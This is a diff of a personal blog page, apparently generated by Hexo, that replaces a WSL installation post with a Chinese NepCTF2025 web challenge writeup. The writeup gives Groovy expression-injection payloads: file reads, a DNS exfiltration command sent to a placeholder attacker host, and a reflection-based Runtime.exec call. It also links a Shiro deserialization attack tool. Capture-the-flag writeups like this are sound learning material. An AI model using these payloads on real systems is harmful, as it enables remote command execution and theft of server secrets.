@@ -20,29 +20,26 @@
     var CONFIG = {"hostname":"m21in.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="wsl安装的一整个过程今天下午心血来潮，突然想安装一个wsl给自己用，之前一直安装有问题，今天花了点时间安装了一下，之前尝试过几次安装，有搞一晚上没搞成功的，可能太菜了，脑子不好用哈哈记录一下踩过的很多坑吧，也希望能帮到有需要的人 wsl网上搜的是有官方的教程的powershell以管理员身份运行 1wsl --install">
+  <meta name="description" content="easyGooGooVVVY题目说是Java的groovy表达式注入碰到groovy表达式注入，有几种方法可以解 读取文件&#x2F;&#x2F; 直接读取 flag 文件内容new File(‘&#x2F;flag’).text">
 <meta property="og:type" content="article">
-<meta property="og:title" content="记一次wsl安装过程,踩过的很多坑都有">
-<meta property="og:url" content="http://m21in.github.io/9a0cdaca.html">
+<meta property="og:title" content="NepCTF2025">
+<meta property="og:url" content="http://m21in.github.io/2998c71a.html">
 <meta property="og:site_name" content="M21in的博客">
-<meta property="og:description" content="wsl安装的一整个过程今天下午心血来潮，突然想安装一个wsl给自己用，之前一直安装有问题，今天花了点时间安装了一下，之前尝试过几次安装，有搞一晚上没搞成功的，可能太菜了，脑子不好用哈哈记录一下踩过的很多坑吧，也希望能帮到有需要的人 wsl网上搜的是有官方的教程的powershell以管理员身份运行 1wsl --install">
+<meta property="og:description" content="easyGooGooVVVY题目说是Java的groovy表达式注入碰到groovy表达式注入，有几种方法可以解 读取文件&#x2F;&#x2F; 直接读取 flag 文件内容new File(‘&#x2F;flag’).text">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://m21in.github.io/images/wsl/wsl_1.png">
-<meta property="og:image" content="http://m21in.github.io/images/wsl/wsl_2.png">
-<meta property="og:image" content="http://m21in.github.io/images/wsl/wsl_3.png">
-<meta property="og:image" content="http://m21in.github.io/images/wsl/wsl_4.png">
-<meta property="og:image" content="http://m21in.github.io/images/wsl/wsl_5.png">
-<meta property="og:image" content="http://m21in.github.io/images/wsl/wsl_6.png">
-<meta property="og:image" content="http://m21in.github.io/images/wsl/wsl_7.png">
-<meta property="article:published_time" content="2025-05-13T07:45:56.000Z">
-<meta property="article:modified_time" content="2025-05-13T12:09:30.690Z">
+<meta property="og:image" content="http://m21in.github.io/D:/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89/blog/themes/next/source/images/nepctf2025/RevengeGooGooVVVY.png">
+<meta property="og:image" content="http://m21in.github.io/D:/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89/blog/themes/next/source/images/nepctf2025/javaseri_1.png">
+<meta property="og:image" content="http://m21in.github.io/D:/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89/blog/themes/next/source/images/nepctf2025/javaseri_2.png">
+<meta property="article:published_time" content="2025-07-26T04:56:14.000Z">
+<meta property="article:modified_time" content="2025-07-30T05:56:37.990Z">
 <meta property="article:author" content="M21in">
-<meta property="article:tag" content="wsl">
-<meta property="article:tag" content="踩坑">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="java">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://m21in.github.io/images/wsl/wsl_1.png">
+<meta name="twitter:image" content="http://m21in.github.io/D:/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89/blog/themes/next/source/images/nepctf2025/RevengeGooGooVVVY.png">
 
-<link rel="canonical" href="http://m21in.github.io/9a0cdaca.html">
+<link rel="canonical" href="http://m21in.github.io/2998c71a.html">
 
 
 <script id="page-configurations">
@@ -55,7 +52,7 @@
   };
 </script>
 
-  <title>记一次wsl安装过程,踩过的很多坑都有 | M21in的博客</title>
+  <title>NepCTF2025 | M21in的博客</title>
   
 
 
@@ -172,7 +169,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://m21in.github.io/9a0cdaca.html">
+    <link itemprop="mainEntityOfPage" href="http://m21in.github.io/2998c71a.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/blog_head.jpg#/images/avatar.gif">
@@ -185,7 +182,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          记一次wsl安装过程,踩过的很多坑都有
+          NepCTF2025
         </h1>
 
         <div class="post-meta">
@@ -194,21 +191,23 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2025-05-13 15:45:56 / 修改时间：20:09:30" itemprop="dateCreated datePublished" datetime="2025-05-13T15:45:56+08:00">2025-05-13</time>
+              <time title="创建时间：2025-07-26 12:56:14" itemprop="dateCreated datePublished" datetime="2025-07-26T12:56:14+08:00">2025-07-26</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-07-30 13:56:37" itemprop="dateModified" datetime="2025-07-30T13:56:37+08:00">2025-07-30</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" itemprop="url" rel="index"><span itemprop="name">环境配置</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -230,21 +229,56 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="wsl安装的一整个过程"><a href="#wsl安装的一整个过程" class="headerlink" title="wsl安装的一整个过程"></a>wsl安装的一整个过程</h1><p>今天下午心血来潮，突然想安装一个wsl给自己用，之前一直安装有问题，今天花了点时间安装了一下，之前尝试过几次安装，有搞一晚上没搞成功的，可能太菜了，脑子不好用哈哈<br>记录一下踩过的很多坑吧，也希望能帮到有需要的人</p>
-<p>wsl网上搜的是有官方的教程的<br>powershell以管理员身份运行</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl <span class="literal">--install</span></span><br></pre></td></tr></table></figure>
-<p>官方给的是可以直接安装好的，但是我这里出了问题<br>跟我很多天前安装的错误一样</p>
-<h2 id="报错0x8000000d"><a href="#报错0x8000000d" class="headerlink" title="报错0x8000000d"></a>报错0x8000000d</h2><p>我显示的是这个报错</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">错误代码: Wsl/InstallDistro/Service/RegisterDistro/<span class="number">0</span>x8000000d</span><br></pre></td></tr></table></figure>
-<p>老错误了，我之前也不知道怎么解决，我就去上网搜<br>是没法安装分型版<br>网上说要开启控制面板的<br><img src="/images/wsl/wsl_1.png"><br>这两个选项，按照教程安装了，还是报错<br>然后我又搜了其他的办法<br>说Windows版本号会有不兼容的问题<br>版本号过低的话是安装不了的<br>这里我的版本号能成功<br><img src="/images/wsl/wsl_2.png"><br>然后我重启了电脑，解决了这个问题</p>
-<h2 id="由于未安装所需的特性-无法启动操作"><a href="#由于未安装所需的特性-无法启动操作" class="headerlink" title="由于未安装所需的特性,无法启动操作"></a>由于未安装所需的特性,无法启动操作</h2><p>如标题所示，安装又出了问题<br>网上搜了，我的问题是没有开启Hyper-V<br>这个hyper-V可以快捷win+r<br>输入</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services.msc</span><br></pre></td></tr></table></figure>
-<p>然后输入h 可以快速定位到hyper-V主机计算服务</p>
-<h1 id="hyper-V主机计算服务无法在此计算机上运行"><a href="#hyper-V主机计算服务无法在此计算机上运行" class="headerlink" title="hyper-V主机计算服务无法在此计算机上运行"></a>hyper-V主机计算服务无法在此计算机上运行</h1><p>我按照教程启动hyper-v时又出了错<br>说我hyper-V无法在本地计算机上启动<br>然后我又上网搜了一下，要更改Windows defender的设置<br>在设置里搜索defender<br><img src="/images/wsl/wsl_3.png"><br>应用和浏览器控制<br><img src="/images/wsl/wsl_4.png"><br>进去之后Exploit protection<br><img src="/images/wsl/wsl_5.png"><br>控制流保护（CFG）<br><img src="/images/wsl/wsl_6.png"><br>要把默认值设为开，设置完重启一下电脑，最后也是成功安装了<br>这里贴一下成功的截图<br><img src="/images/wsl/wsl_7.png"><br>用户跟Linux系统刚安装一样，创建一个低权限用户<br>并设置密码<br>再用这个用户切换到root</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su root</span><br></pre></td></tr></table></figure>
-<p>此时登陆上root<br>然后执行</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd root</span><br></pre></td></tr></table></figure>
-<p>更改为自己想要的密码即可</p>
+        <h1 id="easyGooGooVVVY"><a href="#easyGooGooVVVY" class="headerlink" title="easyGooGooVVVY"></a>easyGooGooVVVY</h1><p>题目说是Java的groovy表达式注入<br>碰到groovy表达式注入，有几种方法可以解</p>
+<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><p>&#x2F;&#x2F; 直接读取 flag 文件内容<br>new File(‘&#x2F;flag’).text</p>
+<p>&#x2F;&#x2F; 或使用系统命令<br>“cat &#x2F;flag”.execute().text<br>这两种解法建立在显示执行结果的前提下</p>
+<h2 id="DNS外带"><a href="#DNS外带" class="headerlink" title="DNS外带"></a>DNS外带</h2><p>&#x2F;&#x2F; 将 flag 作为 DNS 查询子域<br>“dig @ATTACKER-IP $(cat &#x2F;flag | tr -d ‘\n’).yourdomain.com”.execute()</p>
+<p>攻击端操作：<br>使用 tcpdump 捕获 DNS 请求：</p>
+<p>tcpdump -i eth0 udp port 53 -vvn</p>
+<p>从 DNS 查询中提取 flag：</p>
+<p>tcpdump -i eth0 udp port 53 -vvn | grep -oP ‘(?|IN\s+)\K[^.]+(?&#x3D;.yourdomain)’<br>以上建立在能出网的前提下</p>
+<h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><p>可以把flag写入web可以访问的目录，然后访问就能有flag</p>
+<p>&#x2F;&#x2F; 将 flag 写入 Web 可访问目录<br>new File(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt’).text &#x3D; new File(‘&#x2F;flag’).text</p>
+<p>这里用这个payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Math.class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getText()</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-java-lang-Math-class"><a href="#1-java-lang-Math-class" class="headerlink" title="1. java.lang.Math.class"></a>1. <code>java.lang.Math.class</code></h4><ul>
+<li><strong>作用</strong>：获取一个 “基础工具类” 的 “模板”</li>
+<li>类比：<code>Math</code>是 Java 里处理数学计算的工具（比如算平方根、三角函数等），就像你电脑里的 “计算器程序”。</li>
+<li><code>.class</code>在这里的意思是 “获取这个工具的模板说明书”（每个程序在电脑里都有一个 “模板” 来描述它能做什么）。</li>
+<li>为什么用<code>Math</code>？它本身和执行命令无关，只是个 “跳板”—— 就像你想借工具时，先随便拿起身边一个无关的小物件，再用它去换你真正需要的工具（后面会解释为什么需要跳板）。</li>
+</ul>
+<h4 id="2-forName-java-lang-Runtime"><a href="#2-forName-java-lang-Runtime" class="headerlink" title="2. .forName(&quot;java.lang.Runtime&quot;)"></a>2. <code>.forName(&quot;java.lang.Runtime&quot;)</code></h4><ul>
+<li><strong>作用</strong>：用上面的 “模板”，找到并加载 “能执行系统命令的工具”</li>
+<li>类比：<code>java.lang.Runtime</code>是 Java 里一个特殊的工具，它相当于电脑的 “命令执行器”，能直接让电脑做系统级的操作（比如运行程序、执行命令）。</li>
+<li><code>forName(&quot;xxx&quot;)</code>就像 “根据名字找工具”—— 你告诉程序：”帮我找到叫 ‘java.lang.Runtime’ 的这个工具说明书”。</li>
+<li>为什么要 “找”？因为有些环境会限制直接使用这个危险工具，所以先通过<code>Math</code>的模板间接去找，偷偷拿到它的说明书。</li>
+</ul>
+<h4 id="3-getRuntime"><a href="#3-getRuntime" class="headerlink" title="3. .getRuntime()"></a>3. <code>.getRuntime()</code></h4><ul>
+<li><strong>作用</strong>：从 “工具说明书” 中，拿到能实际干活的 “工具实例”</li>
+<li>类比：<code>Runtime</code>这个工具很特殊，整个电脑里只有一个 “真身”（单例模式），就像每个公司只有一个 CEO。</li>
+<li><code>getRuntime()</code>就是 “请 CEO 出来干活”—— 拿到这个唯一能执行命令的实际对象。</li>
+</ul>
+<h4 id="4-exec-whoami"><a href="#4-exec-whoami" class="headerlink" title="4. .exec(&quot;whoami&quot;)"></a>4. <code>.exec(&quot;whoami&quot;)</code></h4><ul>
+<li><strong>作用</strong>：让这个 “命令执行器” 运行具体的命令</li>
+<li>类比：<code>exec(&quot;命令&quot;)</code>就是给 “CEO” 下指令，这里的指令是<code>whoami</code>（一个系统命令）。</li>
+<li><code>whoami</code>的作用：在任何电脑系统（Windows&#x2F;Linux&#x2F;Mac）里，输入这个命令都会返回当前登录的用户名（比如你的电脑用户名是 “张三”，它就会输出 “张三”）。</li>
+<li>效果相当于你手动打开命令提示符 &#x2F; 终端，输入<code>whoami</code>并按回车。</li>
+</ul>
+<h4 id="5-getText"><a href="#5-getText" class="headerlink" title="5. .getText()"></a>5. <code>.getText()</code></h4><ul>
+<li><strong>作用</strong>：获取命令执行后的结果文本</li>
+<li>类比：命令执行后会有输出（比如用户名），<code>getText()</code>就像 “把结果抄下来给你看”。</li>
+<li>注意：这是 Groovy 语言（Java 的 “亲戚”）特有的简化写法，Java 里需要更复杂的步骤才能拿到结果，Groovy 帮我们省了麻烦。</li>
+</ul>
+<h2 id="RevengeGooGooVVVY"><a href="#RevengeGooGooVVVY" class="headerlink" title="RevengeGooGooVVVY"></a>RevengeGooGooVVVY</h2><p>这题跟上题的payload一样</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Math.class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;env&quot;</span>).getText()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/D:/网安\网安\blog\themes\next\source\images\nepctf2025\RevengeGooGooVVVY.png"></p>
+<h2 id="JavaSeri"><a href="#JavaSeri" class="headerlink" title="JavaSeri"></a>JavaSeri</h2><p><img src="/D:/网安\网安\blog\themes\next\source\images\nepctf2025\javaseri_1.png"></p>
+<p>关键词：javaseri，rememberme 赌一把，拿工具可以一把梭</p>
+<p><img src="/D:/网安\网安\blog\themes\next\source\images\nepctf2025\javaseri_2.png"></p>
+<p>flag在环境变量里</p>
+<p>工具下载地址：(<a target="_blank" rel="noopener" href="https://github.com/SummerSec/ShiroAttack2/releases/tag/4.7.0">https://github.com/SummerSec/ShiroAttack2/releases/tag/4.7.0</a>)</p>
 
     </div>
 
@@ -254,8 +288,9 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/wsl/" <i class="fa fa-tag"></i> wsl</a>
-              <a href="/tags/%E8%B8%A9%E5%9D%91/" <i class="fa fa-tag"></i> 踩坑</a>
+              <a href="/tags/web/" <i class="fa fa-tag"></i> web</a>
+              <a href="/tags/writeup/" <i class="fa fa-tag"></i> writeup</a>
+              <a href="/tags/java/" <i class="fa fa-tag"></i> java</a>
           </div>
 
         
@@ -264,13 +299,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/135d20d.html" rel="prev" title="CTF&渗透一些基础入门学习">
-      <i class="fa fa-chevron-left"></i> CTF&渗透一些基础入门学习
+    <a href="/c287ea60.html" rel="prev" title="ctfshow-sql注入">
+      <i class="fa fa-chevron-left"></i> ctfshow-sql注入
     </a></div>
-      <div class="post-nav-item">
-    <a href="/c287ea60.html" rel="next" title="ctfshow-sql注入">
-      ctfshow-sql注入 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -330,7 +362,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#wsl%E5%AE%89%E8%A3%85%E7%9A%84%E4%B8%80%E6%95%B4%E4%B8%AA%E8%BF%87%E7%A8%8B"><span class="nav-number">1.</span> <span class="nav-text">wsl安装的一整个过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%990x8000000d"><span class="nav-number">1.1.</span> <span class="nav-text">报错0x8000000d</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%B1%E4%BA%8E%E6%9C%AA%E5%AE%89%E8%A3%85%E6%89%80%E9%9C%80%E7%9A%84%E7%89%B9%E6%80%A7-%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E6%93%8D%E4%BD%9C"><span class="nav-number">1.2.</span> <span class="nav-text">由于未安装所需的特性,无法启动操作</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hyper-V%E4%B8%BB%E6%9C%BA%E8%AE%A1%E7%AE%97%E6%9C%8D%E5%8A%A1%E6%97%A0%E6%B3%95%E5%9C%A8%E6%AD%A4%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%8A%E8%BF%90%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">hyper-V主机计算服务无法在此计算机上运行</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#easyGooGooVVVY"><span class="nav-number">1.</span> <span class="nav-text">easyGooGooVVVY</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">1.1.</span> <span class="nav-text">读取文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS%E5%A4%96%E5%B8%A6"><span class="nav-number">1.2.</span> <span class="nav-text">DNS外带</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="nav-number">1.3.</span> <span class="nav-text">写入文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-java-lang-Math-class"><span class="nav-number">1.3.0.1.</span> <span class="nav-text">1. java.lang.Math.class</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-forName-java-lang-Runtime"><span class="nav-number">1.3.0.2.</span> <span class="nav-text">2. .forName(&quot;java.lang.Runtime&quot;)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-getRuntime"><span class="nav-number">1.3.0.3.</span> <span class="nav-text">3. .getRuntime()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-exec-whoami"><span class="nav-number">1.3.0.4.</span> <span class="nav-text">4. .exec(&quot;whoami&quot;)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-getText"><span class="nav-number">1.3.0.5.</span> <span class="nav-text">5. .getText()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RevengeGooGooVVVY"><span class="nav-number">1.4.</span> <span class="nav-text">RevengeGooGooVVVY</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JavaSeri"><span class="nav-number">1.5.</span> <span class="nav-text">JavaSeri</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
